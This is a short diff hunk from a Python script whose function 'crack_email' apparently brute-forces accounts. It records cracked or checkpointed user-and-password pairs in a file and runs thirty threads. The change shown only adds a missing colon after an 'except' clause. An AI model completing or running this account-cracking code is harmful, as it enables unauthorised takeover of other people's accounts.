@@ -623,7 +623,7 @@ def crack_email():
                                 cps.write('[CP]' + c + user + k + ' | ' + pass5 + '\n')
                                 cps.close()
                                 cekpoint.append(user + pass5)
-        except
+        except:
             pass
 
     p = ThreadPool(30)
